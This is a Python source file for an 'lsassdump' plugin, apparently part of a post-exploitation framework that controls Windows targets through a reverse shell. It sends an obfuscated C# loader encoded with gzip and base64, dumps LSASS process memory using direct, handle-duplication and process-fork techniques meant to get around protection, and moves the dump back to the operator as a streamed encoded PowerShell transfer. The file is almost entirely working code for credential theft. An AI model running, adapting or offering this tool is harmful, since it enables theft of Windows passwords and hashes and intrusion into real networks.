import base64
import gzip
import hashlib
import os
import select
import sys
import time

from ..api import plugin, SessionContext

_USAGE = """lsassdump — LSASS minidump.

Usage:
  run lsassdump --dump [--fork] [--duplicate] [--elevate] [--out <path>]
  run lsassdump --help

Options:
  --dump            Create a minidump of LSASS.
  --fork            Use NtCreateSection + NtCreateProcessEx to dump a child
                    process backed by LSASS's image. Works on PPL-protected
                    LSASS when PROCESS_CREATE_PROCESS is granted.
  --duplicate       Walk the system handle table for a handle another
                    process holds to LSASS with PROCESS_VM_READ and borrow
                    it. Avoids a direct OpenProcess on LSASS; slow, and
                    requires a suitable holder to exist.
  --elevate         Attempt to acquire SeDebugPrivilege before opening
                    LSASS. Skip this when already running as SYSTEM.
  --out <path>      Path on the OPERATOR machine to save the dump.
                    Default: ./lsass.dmp. `~` is expanded.

The dump is staged on the target at %TEMP%\\lsass.dmp, then pulled back to
the operator with the framework's chunked download (SHA-256 verified). The
staging file on the target is left in place; remove it manually if needed.

Technique precedence when multiple flags are passed:
  1. Direct OpenProcess (always tried first)
  2. --duplicate (if direct open failed)
  3. --fork      (if both previous attempts failed)
"""

_CS_PATH = os.path.join(os.path.dirname(__file__), '_lsass_dump.cs')

_OK_MARKER   = '__LSASS_OK__:'
_ERR_MARKER  = '__LSASS_ERR__:'
_END_MARKER  = '__LSASS_END__'


def _load_cs() -> str:
    try:
        with open(_CS_PATH, 'r', encoding='utf-8') as fh:
            return fh.read()
    except OSError:
        return ''


_LSASS_CS = _load_cs()

if _LSASS_CS:
    _CS_VERSION = hashlib.sha256(_LSASS_CS.encode('utf-8')).hexdigest()[:8]
    _CLASS_NAME = f'LsassDumper_{_CS_VERSION}'
    _TAGGED_CS  = _LSASS_CS.replace(
        'class LsassDumper', f'class {_CLASS_NAME}', 1,
    )
else:
    _CS_VERSION = '0'
    _CLASS_NAME = 'LsassDumper_0'
    _TAGGED_CS  = ''


def _cs_bootstrap_ps() -> str:
    if not _TAGGED_CS:
        return (
            "$ErrorActionPreference='SilentlyContinue'\n"
            "Write-Output '__LSASS_ERR__:LsassDumper source missing "
            "(_lsass_dump.cs not found)'\n"
        )
    compressed = gzip.compress(_TAGGED_CS.encode('utf-8'), compresslevel=9)
    b64 = base64.b64encode(compressed).decode('ascii')
    return (
        f"if (-not ('{_CLASS_NAME}' -as [type])) {{\n"
        f"  $b = '{b64}'\n"
        "  try {\n"
        "    $raw = [Convert]::FromBase64String($b)\n"
        "    $ms = New-Object IO.MemoryStream(,$raw)\n"
        "    $gz = New-Object IO.Compression.GZipStream($ms, [IO.Compression.CompressionMode]::Decompress)\n"
        "    $sr = New-Object IO.StreamReader($gz)\n"
        "    $src = $sr.ReadToEnd()\n"
        "    $sr.Dispose(); $gz.Dispose(); $ms.Dispose()\n"
        "    Add-Type -TypeDefinition $src -Language CSharp -ErrorAction Stop\n"
        "  } catch {\n"
        "    Write-Output ('__LSASS_ERR__:Add-Type failed: ' + $_.Exception.Message)\n"
        "    return\n"
        "  }\n"
        "}\n"
    )


def _run_ps(session, ps, timeout=60.0, until_marker=None):
    """Send PowerShell and return output. Returns '' on transport failure.

    Flushes any pending shell output first so a late response from an
    earlier command cannot be mistaken for this command's response. When
    `until_marker` is provided, recv_output keeps reading until the marker
    appears or the timeout elapses — required for commands whose first
    output is delayed by several seconds (Add-Type compilation, large
    disk writes).
    """
    handler = session._handler
    sock = session._client_sock
    try:
        handler._flush_shell(sock, timeout=0.5)
    except Exception:
        pass
    try:
        if not handler._send_win_ps(sock, ps):
            return ''
    except Exception:
        return ''
    try:
        return handler.recv_output(
            sock, timeout=timeout, until_marker=until_marker
        ) or ''
    except Exception:
        return ''


def _first_line_after(text: str, marker: str):
    """Return the first non-empty line after `marker`, or None."""
    if marker not in text:
        return None
    for line in text.split(marker, 1)[1].splitlines():
        line = line.strip()
        if line:
            return line
    return None


def _ps_single_quote(s: str) -> str:
    """Escape a string for inclusion in a PowerShell single-quoted literal."""
    return str(s).replace("'", "''")


def _fast_download_win(session, remote_path, local_path,
                       total_size=None,
                       chunk_bytes=32 * 1024,
                       idle_timeout=120.0,
                       progress_interval=0.5):
    """Stream a Windows file to the operator with one long-running PS script.

    The framework's ``download_file()`` re-launches a PowerShell process for
    every ~6 KB chunk (bounded by the inline command-length limit). That
    makes a 50 MB dump take tens of minutes, dominated by PS startup time
    rather than network throughput. This implementation sends a single
    script that reads the whole file in a loop and emits base64 chunks,
    so the transfer is bound by the network and disk, not by process
    creation.

    Protocol (all on the target's stdout):
        __LNBOOT__                              script started
        __LNCHUNK__<base64>__LNCHUNKEND__       one chunk (repeated)
        __LNERR__<message>                      on target-side error
        __LNDONE__                              script finished
    """
    handler = session._handler
    sock    = session._client_sock
    colors  = session.colors

    BOOT_MARK  = '__LNBOOT__'
    START_MARK = '__LNCHUNK__'
    END_MARK   = '__LNCHUNKEND__'
    HASH_MARK  = '__LNHASH__'
    DONE_MARK  = '__LNDONE__'
    ERR_MARK   = '__LNERR__'

    escaped = _ps_single_quote(remote_path)

    ps = (
        f"$p='{escaped}';"
        f"$c={int(chunk_bytes)};"
        f"[Console]::Out.WriteLine('{BOOT_MARK}');"
        "[Console]::Out.Flush();"
        "try{"
        "  $fs=[IO.File]::OpenRead($p);"
        "  try{"
        "    $b=New-Object byte[] $c;"
        "    $sha=[System.Security.Cryptography.SHA256]::Create();"
        "    while(($n=$fs.Read($b,0,$c)) -gt 0){"
        f"      [Console]::Out.WriteLine('{START_MARK}'+[Convert]::ToBase64String($b,0,$n)+'{END_MARK}');"
        "      [Console]::Out.Flush();"
        "      [void]$sha.TransformBlock($b,0,$n,$b,0);"
        "    }"
        "    [void]$sha.TransformFinalBlock([byte[]]@(),0,0);"
        "    $hash=-join ($sha.Hash | ForEach-Object { '{0:x2}' -f $_ });"
        f"    [Console]::Out.WriteLine('{HASH_MARK}'+$hash);"
        "    [Console]::Out.Flush();"
        "  } finally { $fs.Close() };"
        "}catch{"
        f"  [Console]::Out.WriteLine('{ERR_MARK}'+$_.Exception.Message);"
        "  [Console]::Out.Flush();"
        "};"
        f"[Console]::Out.WriteLine('{DONE_MARK}');"
        "[Console]::Out.Flush();"
    )

    try:
        handler._flush_shell(sock, timeout=1.5)
    except Exception:
        pass

    try:
        encoded = base64.b64encode(ps.encode('utf-16-le')).decode('ascii')
    except Exception as exc:
        session.print(f"{colors['red']}Failed to encode script: {exc}{colors['end']}")
        return False

    cmd = f"powershell -NoProfile -NonInteractive -EncodedCommand {encoded}"
    try:
        if not handler.send_to_revshell(sock, cmd):
            session.print(f"{colors['red']}Failed to send download script{colors['end']}")
            return False
    except Exception as exc:
        session.print(f"{colors['red']}Send failed: {exc}{colors['end']}")
        return False

    parent = os.path.dirname(os.path.abspath(local_path))
    if parent:
        os.makedirs(parent, exist_ok=True)

    b_boot  = BOOT_MARK.encode()
    b_start = START_MARK.encode()
    b_end   = END_MARK.encode()
    b_hash  = HASH_MARK.encode()
    b_done  = DONE_MARK.encode()
    b_err   = ERR_MARK.encode()

    buf           = b''
    written       = 0
    received_hash = None
    start_time    = time.time()
    last_data     = start_time
    last_render   = 0.0
    done          = False
    saw_boot      = False

    boot_deadline = start_time + 20.0
    hard_deadline = start_time + 1800.0

    try:
        with open(local_path, 'wb') as f:
            while not done:
                now = time.time()

                if now > hard_deadline:
                    sys.stdout.write('\n'); sys.stdout.flush()
                    session.print(
                        f"{colors['red']}Download exceeded hard "
                        f"deadline ({int(hard_deadline - start_time)}s)"
                        f"{colors['end']}"
                    )
                    return False

                try:
                    r, _, _ = select.select([sock], [], [], 1.0)
                except Exception as exc:
                    sys.stdout.write('\n'); sys.stdout.flush()
                    session.print(f"{colors['red']}select failed: {exc}{colors['end']}")
                    return False

                if not r:
                    if not saw_boot and time.time() > boot_deadline:
                        sys.stdout.write('\n'); sys.stdout.flush()
                        session.print(
                            f"{colors['red']}Download script did not start "
                            f"(no {BOOT_MARK} within 20s). The target shell "
                            f"may have rejected the script.{colors['end']}"
                        )
                        return False
                    if time.time() - last_data > idle_timeout:
                        sys.stdout.write('\n'); sys.stdout.flush()
                        session.print(
                            f"{colors['red']}Download stalled "
                            f"(no data for {int(idle_timeout)}s){colors['end']}"
                        )
                        return False
                    continue

                try:
                    data = sock.recv(262144)
                except Exception as exc:
                    sys.stdout.write('\n'); sys.stdout.flush()
                    session.print(f"{colors['red']}recv failed: {exc}{colors['end']}")
                    return False

                if not data:
                    sys.stdout.write('\n'); sys.stdout.flush()
                    session.print(
                        f"{colors['red']}Connection closed mid-transfer{colors['end']}"
                    )
                    return False

                buf += data
                last_data = time.time()

                if not saw_boot and b_boot in buf:
                    saw_boot = True

                while True:
                    si = buf.find(b_start)
                    if si == -1:
                        break
                    ei = buf.find(b_end, si + len(b_start))
                    if ei == -1:
                        break
                    payload = buf[si + len(b_start):ei]
                    try:
                        raw = base64.b64decode(payload, validate=False)
                    except Exception:
                        sys.stdout.write('\n'); sys.stdout.flush()
                        session.print(f"{colors['red']}Malformed chunk{colors['end']}")
                        return False
                    f.write(raw)
                    written += len(raw)
                    buf = buf[ei + len(b_end):]

                if b_err in buf:
                    ei = buf.find(b_err)
                    tail = buf[ei + len(b_err):].split(b'\n', 1)[0]
                    msg = tail.decode(errors='ignore').strip()
                    sys.stdout.write('\n'); sys.stdout.flush()
                    session.print(f"{colors['red']}Target error: {msg}{colors['end']}")
                    return False

                if received_hash is None and b_hash in buf:
                    hi = buf.find(b_hash)
                    nl = buf.find(b'\n', hi)
                    if nl != -1:
                        hval = buf[hi + len(b_hash):nl].strip()
                        received_hash = hval.decode('ascii', errors='ignore').lower()
                        if len(received_hash) != 64:
                            sys.stdout.write('\n'); sys.stdout.flush()
                            session.print(
                                f"{colors['red']}Malformed hash from target: "
                                f"{received_hash!r}{colors['end']}"
                            )
                            return False

                if b_done in buf:
                    done = True

                if time.time() - last_render >= progress_interval:
                    last_render = time.time()
                    mb = written / 1024.0 / 1024.0
                    rate = mb / max(0.001, time.time() - start_time)
                    if total_size:
                        total_mb = total_size / 1024.0 / 1024.0
                        pct = written * 100.0 / total_size
                        sys.stdout.write(
                            f"\r{colors['cyan']}{pct:5.1f}%  "
                            f"{mb:.1f}/{total_mb:.1f} MB  "
                            f"{rate:.2f} MB/s{colors['end']}"
                        )
                    else:
                        sys.stdout.write(
                            f"\r{colors['cyan']}{mb:.1f} MB  "
                            f"{rate:.2f} MB/s{colors['end']}"
                        )
                    sys.stdout.flush()

    except OSError as exc:
        sys.stdout.write('\n'); sys.stdout.flush()
        session.print(f"{colors['red']}Local write failed: {exc}{colors['end']}")
        return False

    sys.stdout.write('\n'); sys.stdout.flush()

    if written == 0:
        session.print(
            f"{colors['red']}Download produced 0 bytes — target file may be "
            f"unreadable or empty{colors['end']}"
        )
        return False

    elapsed = max(0.001, time.time() - start_time)
    mb = written / 1024.0 / 1024.0
    session.print(
        f"{colors['green']}Downloaded {mb:.1f} MB in "
        f"{elapsed:.1f}s ({mb/elapsed:.2f} MB/s){colors['end']}"
    )

    if not received_hash:
        session.print(
            f"{colors['red']}Target did not return a SHA-256 hash — "
            f"transfer cannot be verified{colors['end']}"
        )
        return False

    session.print(f"{colors['cyan']}Verifying SHA-256...{colors['end']}")
    try:
        local_hash = handler._sha256_file(local_path)
    except Exception as exc:
        session.print(f"{colors['red']}Local hash failed: {exc}{colors['end']}")
        return False

    if local_hash.lower() != received_hash.lower():
        session.print(
            f"{colors['red']}SHA-256 mismatch!{colors['end']}\n"
            f"  target: {received_hash}\n"
            f"  local:  {local_hash.lower()}"
        )
        return False

    session.print(
        f"{colors['green']}SHA-256 verified: {received_hash}{colors['end']}"
    )
    return True


def _parse_args(args):
    """Return (action, opts) or (None, error_message)."""
    if args is None:
        return None, None
    if not isinstance(args, (list, tuple)):
        try:
            args = list(args)
        except TypeError:
            return None, 'invalid arguments'

    if not args:
        return 'help', None

    first = args[0]
    if first in ('-h', '--help', 'help'):
        return 'help', None

    known = {'--dump', '-d', '--fork', '--duplicate', '--elevate', '--out'}
    if first not in known:
        return None, f"unknown command: {first!r}"

    use_fork    = '--fork' in args
    use_dup     = '--duplicate' in args
    use_elevate = '--elevate' in args

    out_path = 'lsass.dmp'
    i = 0
    while i < len(args):
        if args[i] == '--out':
            if i + 1 >= len(args):
                return None, '--out requires a value'
            out_path = args[i + 1]
            i += 2
            continue
        i += 1

    if not out_path or not str(out_path).strip():
        return None, '--out value is empty'

    return 'dump', {
        'fork': use_fork,
        'duplicate': use_dup,
        'elevate': use_elevate,
        'out': str(out_path),
    }


@plugin.command(
    name='lsassdump',
    platforms=['windows'],
    description='LSASS minidump via MiniDumpWriteDump (NtCreateProcessEx fork fallback)',
)
def run(session: SessionContext, args):
    colors = session.colors

    action, opts = _parse_args(args)
    if action == 'help':
        session.print(_USAGE)
        return 0
    if action is None:
        if opts:
            session.print(f"{colors['red']}{opts}{colors['end']}")
        session.print(_USAGE)
        return 1

    use_fork    = opts['fork']
    use_dup     = opts['duplicate']
    use_elevate = opts['elevate']
    local_out   = opts['out']
    remote_out  = r'%TEMP%\lsass.dmp'

    local_out = os.path.abspath(os.path.expanduser(local_out))
    if os.path.isdir(local_out):
        session.print(f"{colors['red']}--out is a directory: {local_out}{colors['end']}")
        return 1

    session.print(f"{colors['cyan']}Running LSASS dump...{colors['end']}")
    session.print(f"  Fork: {use_fork}  Duplicate: {use_dup}  Elevate: {use_elevate}")
    session.print(f"  Target staging:  {remote_out}")
    session.print(f"  Operator output: {local_out}")

    bootstrap = _cs_bootstrap_ps()
    dump_ps = bootstrap + (
        "$out = [Environment]::ExpandEnvironmentVariables('{out}')\n"
        "if (-not $out -or $out.Contains('%')) {{\n"
        "  $leaf = Split-Path -Leaf '{out}'\n"
        "  $out = Join-Path ([IO.Path]::GetTempPath()) $leaf\n"
        "}}\n"
        "try {{\n"
        f"  $result = [{_CLASS_NAME}]::DumpLsass({{fork}}, {{dup}}, {{elev}}, $out)\n"
        "  if ($result -eq 'OK') {{\n"
        "    $fi = Get-Item -LiteralPath $out -ErrorAction Stop\n"
        "    Write-Output ('{ok}' + $out + '|' + $fi.Length)\n"
        "  }} else {{\n"
        "    Write-Output ('{err}' + $result)\n"
        "  }}\n"
        "}} catch {{\n"
        "  Write-Output ('{err}' + $_.Exception.Message)\n"
        "}}\n"
        "Write-Output '{end}'\n"
    ).format(
        out=_ps_single_quote(remote_out),
        fork='$true' if use_fork else '$false',
        dup='$true' if use_dup else '$false',
        elev='$true' if use_elevate else '$false',
        ok=_OK_MARKER,
        err=_ERR_MARKER,
        end=_END_MARKER,
    )

    out = _run_ps(
        session, dump_ps, timeout=120.0, until_marker=_END_MARKER,
    )

    if not out:
        err = 'no output from target (transport failure or timeout)'
        session.print(f"{colors['red']}Dump failed: {err}{colors['end']}")
        session.log_plugin_result('lsassdump', '', f'error: {err}')
        return 1

    err_line = _first_line_after(out, _ERR_MARKER)
    if err_line:
        session.print(f"{colors['red']}Dump failed: {err_line}{colors['end']}")
        session.log_plugin_result('lsassdump', '', f'error: {err_line}')
        return 1

    ok_line = _first_line_after(out, _OK_MARKER)
    if ok_line is None:
        snippet = out.strip()[:400] or 'empty output'
        session.print(f"{colors['red']}Dump failed: unexpected output: {snippet}{colors['end']}")
        session.log_plugin_result('lsassdump', '', f'unexpected: {snippet}')
        return 1

    if '|' not in ok_line:
        session.print(
            f"{colors['red']}Dump reported OK but response is malformed: "
            f"{ok_line!r}{colors['end']}"
        )
        session.log_plugin_result('lsassdump', '', f'bad_ok={ok_line!r}')
        return 1

    target_path, _, size_token = ok_line.rpartition('|')
    target_path = target_path.strip()
    size_token  = size_token.strip()

    try:
        size = int(size_token)
    except ValueError:
        session.print(
            f"{colors['red']}Dump reported OK but size is unreadable: "
            f"{ok_line!r}{colors['end']}"
        )
        session.log_plugin_result('lsassdump', '', f'bad_size={ok_line!r}')
        return 1

    if size <= 0:
        session.print(
            f"{colors['red']}Dump reported OK but file is empty "
            f"({size} bytes at {target_path}){colors['end']}"
        )
        session.log_plugin_result('lsassdump', '', f'size={size}')
        return 1

    session.print(
        f"{colors['green']}Dump created on target: {target_path} "
        f"({size:,} bytes){colors['end']}"
    )

    session.print(f"{colors['cyan']}Downloading to operator...{colors['end']}")
    if session.is_windows:
        ok = _fast_download_win(
            session, target_path, local_out, total_size=size,
        )
    else:
        ok = session.download(target_path, local_out)

    if not ok:
        session.print(
            f"{colors['red']}Download failed — dump remains on target at "
            f"{target_path}{colors['end']}"
        )
        session.log_plugin_result(
            'lsassdump', '',
            f'download failed, remote={target_path} size={size}',
        )
        return 1

    session.print(
        f"{colors['green']}Dump saved: {local_out} ({size:,} bytes)"
        f"{colors['end']}"
    )
    session.log_plugin_result(
        'lsassdump', f'Dump saved: {local_out}',
        f'remote={target_path} size={size}',
    )
    return 0